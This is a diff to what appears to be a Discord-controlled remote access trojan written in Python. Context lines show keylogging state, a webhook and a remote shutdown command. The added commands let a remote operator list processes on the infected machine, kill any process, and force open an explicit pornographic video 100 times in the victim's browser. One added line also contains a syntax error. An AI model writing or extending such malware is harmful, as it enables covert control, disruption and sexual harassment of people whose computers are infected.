@@ -40,7 +40,7 @@ import GPUtil
 import psutil
 import platform
 import winreg
-
+import webbrowser
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -50,7 +50,7 @@ async def spam_injecting():
         await asyncio.sleep(0.1)
 
 TOKEN = 'sex'
-WEBHOOK_URL = 'sex'
+WEBHOOK_URL = 'sex''
 
 keystrokes = ""  
 is_logging = False  
@@ -794,6 +794,32 @@ async def shutdown(ctx):
         os.system("shutdown /s /t 0")
     elif platform.system() == "Linux" or platform.system() == "Darwin":
         os.system("shutdown -h now")
+
+@bot.command()
+async def processes(ctx):
+    processes = sorted(psutil.process_iter(attrs=['pid', 'name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)[:5]
+    msg = "Top 5 Processes:\n" + "\n".join(f"{p.info['name']} (PID: {p.info['pid']}) - {p.info['cpu_percent']}% CPU" for p in processes)
+    await ctx.send(f"```{msg}```")
+
+@bot.command()
+async def kill(ctx, pid: int):
+    try:
+        p = psutil.Process(pid)
+        p.terminate()
+        await ctx.send(f"Process {pid} terminated.")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
+@bot.command()
+async def goon(ctx):
+    
+    website = "https://www.pornhub.com/view_video.php?viewkey=679d0fad8fa04"  
+    windows = 100  
+
+    for _ in range(windows):
+        webbrowser.open(website)
+
+    await ctx.send("If ykyk, 🔞  🍆 🌊.  ( btw this just opened pornhub 100 times )")
 
 
 
